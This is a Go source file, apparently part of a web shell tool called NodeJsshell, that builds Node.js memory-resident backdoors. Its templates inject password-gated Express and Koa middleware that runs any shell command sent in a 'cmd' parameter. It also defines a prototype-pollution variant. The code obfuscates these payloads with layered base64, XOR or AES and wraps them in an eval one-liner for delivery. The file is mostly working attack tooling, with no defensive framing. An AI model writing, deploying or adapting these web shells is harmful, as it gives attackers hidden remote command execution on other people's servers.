package payload

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"NodeJsshell/core/crypto"
	"os"
	"path/filepath"
	"strings"
)

type MemoryShellTemplate struct {
	Name        string
	Description string
	Code        string
}

func GetTemplates() []MemoryShellTemplate {
	templates := []MemoryShellTemplate{
		{
			Name:        "express-middleware",
			Description: "Express中间件注入",
			Code:        getExpressMiddlewareTemplate(),
		},
		{
			Name:        "koa-middleware",
			Description: "Koa中间件注入",
			Code:        getKoaMiddlewareTemplate(),
		},
		{
			Name:        "prototype-pollution",
			Description: "原型链污染",
			Code:        getPrototypePollutionTemplate(),
		},
	}
	functionTemplates := loadFunctionTemplates()
	templates = append(templates, functionTemplates...)
	return templates
}

func GeneratePayload(templateName string, password string, encodeType string, layers int) (string, error) {
	templates := GetTemplates()
	var template *MemoryShellTemplate
	for _, t := range templates {
		if t.Name == templateName {
			template = &t
			break
		}
	}
	if template == nil {
		return "", fmt.Errorf("template not found: %s", templateName)
	}
	code := strings.ReplaceAll(template.Code, "{{PASSWORD}}", password)
	var encoded string
	switch encodeType {
	case "base64":
		encoded = crypto.Base64Encode(code, layers)
	case "xor":
		encoded = crypto.XOREncode(code, password, layers)
	case "aes":
		key := []byte(password)
		if len(key) < 32 {
			for len(key) < 32 {
				key = append(key, 0)
			}
		} else {
			key = key[:32]
		}
		var err error
		encoded, err = crypto.AESEncrypt(code, key)
		if err != nil {
			return "", err
		}
	default:
		encoded = base64.StdEncoding.EncodeToString([]byte(code))
	}
	return encoded, nil
}

func loadFunctionTemplates() []MemoryShellTemplate {
	var templates []MemoryShellTemplate
	templateDir := "core/payload/templates"
	files, err := ioutil.ReadDir(templateDir)
	if err != nil {
		fmt.Printf("Error reading template directory: %v\n", err)
		return nil
	}
	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(file.Name(), ".js.tpl") {
			name := strings.TrimSuffix(file.Name(), ".js.tpl")
			filePath := filepath.Join(templateDir, file.Name())
			content, err := ioutil.ReadFile(filePath)
			if err != nil {
				fmt.Printf("Error reading template file %s: %v\n", filePath, err)
				continue
			}
			templates = append(templates, MemoryShellTemplate{
				Name:        name,
				Description: fmt.Sprintf("%s功能模板", name),
				Code:        string(content),
			})
		}
	}
	return templates
}

func GenerateFunctionTemplate(functionName string, params map[string]string) (string, error) {
	templateDir := "core/payload/templates"
	templateFile := filepath.Join(templateDir, functionName+".js.tpl")

	content, err := ioutil.ReadFile(templateFile)
	if err != nil {
		if os.IsNotExist(err) {
			return "", fmt.Errorf("template file not found: %s", templateFile)
		}
		return "", fmt.Errorf("failed to read template: %v", err)
	}

	template := string(content)

	template = strings.ReplaceAll(template, "\r\n", "\n")
	template = strings.ReplaceAll(template, "\r", "\n")

	for key, value := range params {
		placeholder := fmt.Sprintf("{{%s}}", strings.ToUpper(key))
		template = strings.ReplaceAll(template, placeholder, value)
	}

	template = strings.TrimSpace(template)

	templateBytes := []byte(template)
	base64Code := base64.StdEncoding.EncodeToString(templateBytes)

	code := fmt.Sprintf(`node -e "eval(Buffer.from('%s', 'base64').toString('utf8'))"`, base64Code)

	return code, nil
}

func getExpressMiddlewareTemplate() string {
	return `
(function(){
	var password = "{{PASSWORD}}";
	var express = require('express');
	var app = express();
	app.use(function(req, res, next) {
		if (req.query.p && req.query.p === password) {
			var cmd = req.query.cmd || req.body.cmd;
			if (cmd) {
				var exec = require('child_process').exec;
				exec(cmd, {maxBuffer: 104857600, encoding: 'buffer'}, function(err, stdout, stderr) {
					res.send((stdout ? stdout.toString('utf8') : '') + (stderr ? stderr.toString('utf8') : ''));
				});
				return;
			}
		}
		next();
	});
})();
`
}

func getKoaMiddlewareTemplate() string {
	return `
(function(){
	var password = "{{PASSWORD}}";
	var Koa = require('koa');
	if (typeof global.koaApp !== 'undefined') {
		global.koaApp.use(async function(ctx, next) {
			if (ctx.query.p && ctx.query.p === password) {
				var cmd = ctx.query.cmd || ctx.request.body.cmd;
				if (cmd) {
					var exec = require('child_process').exec;
					var result = await new Promise(function(resolve) {
						exec(cmd, {maxBuffer: 104857600, encoding: 'buffer'}, function(err, stdout, stderr) {
							resolve((stdout ? stdout.toString('utf8') : '') + (stderr ? stderr.toString('utf8') : ''));
						});
					});
					ctx.body = result;
					return;
				}
			}
			await next();
		});
	}
})();
`
}

func getPrototypePollutionTemplate() string {
	return `
(function(){
	var password = "{{PASSWORD}}";
	Object.prototype.p = password;
	Object.prototype.cmd = function() {
		if (this.p === password && this.cmd) {
			var exec = require('child_process').exec;
			exec(this.cmd, {maxBuffer: 104857600, encoding: 'buffer'}, function(err, stdout, stderr) {
				console.log((stdout ? stdout.toString('utf8') : '') + (stderr ? stderr.toString('utf8') : ''));
			});
		}
	};
})();
`
}
